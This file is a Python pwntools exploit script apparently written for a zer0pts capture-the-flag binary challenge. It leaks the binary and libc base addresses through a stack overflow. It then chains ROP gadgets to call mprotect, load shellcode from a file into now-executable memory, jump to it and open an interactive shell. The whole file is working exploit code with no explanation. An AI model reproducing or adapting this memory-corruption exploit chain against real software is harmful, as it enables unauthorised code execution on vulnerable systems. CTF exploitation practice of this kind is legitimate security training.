#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./bin/chall --host pwn2.ctf.zer0pts.com --port 9004
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./bin/chall')

# TODO: changeme
libc = ELF("./libc.so.6")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn2.ctf.zer0pts.com'
port = int(args.PORT or 9004)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.sendafter(b"> ", b"A"*40 + b"\x83")
binary_leak = u64(io.recv()[40:].ljust(8, b"\0"))
binary_base = binary_leak - 5256

print(f"binary_leak: {hex(binary_leak)}, binary_base: {hex(binary_base)}")

getlong_addr = binary_base + 0x13f4
pop_rdi = binary_base + 0x1bc3
read_got_entry = binary_base + 0x3f90

print(f"read_got_entry: {hex(read_got_entry)}")

ropchain1 = b"A"*40
ropchain1 += p64(pop_rdi)
ropchain1 += p64(read_got_entry)
ropchain1 += p64(getlong_addr)

sleep(0.5)
io.send(ropchain1)

read_addr = u64(io.recv().ljust(8, b'\0'))
libc_base = read_addr - libc.sym["read"]
print(f"libc_base: {hex(libc_base)}")

mprotect_addr = libc_base + libc.sym["mprotect"]
pop_rsi =   libc_base + 0x2604f
pop_rdx_pop_rbx = libc_base + 0x15f82e

RWX_PROT = 7


with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

ropchain2 = b"A"*40
ropchain2 += p64(pop_rdi)
ropchain2 += p64(binary_base)   # addr
ropchain2 += p64(pop_rsi)
ropchain2 += p64(0x1000)        # length
ropchain2 += p64(pop_rdx_pop_rbx)
ropchain2 += p64(RWX_PROT)      # prot
ropchain2 += p64(0xcafebabe)
ropchain2 += p64(mprotect_addr) # mprotext(addr, length, prot)
ropchain2 += p64(pop_rdi)
ropchain2 += p64(0)             # fd
ropchain2 += p64(pop_rsi)
ropchain2 += p64(binary_base)   # buf
ropchain2 += p64(pop_rdx_pop_rbx)
ropchain2 += p64(0x1000)        # count
ropchain2 += p64(0xcafebabe)
ropchain2 += p64(read_addr)
ropchain2 += p64(binary_base + 8)

sleep(0.5)
io.send(ropchain2)

sleep(0.5)
system_addr = libc_base + libc.sym["system"]
io.send(p64(libc_base) + shellcode)

io.interactive()

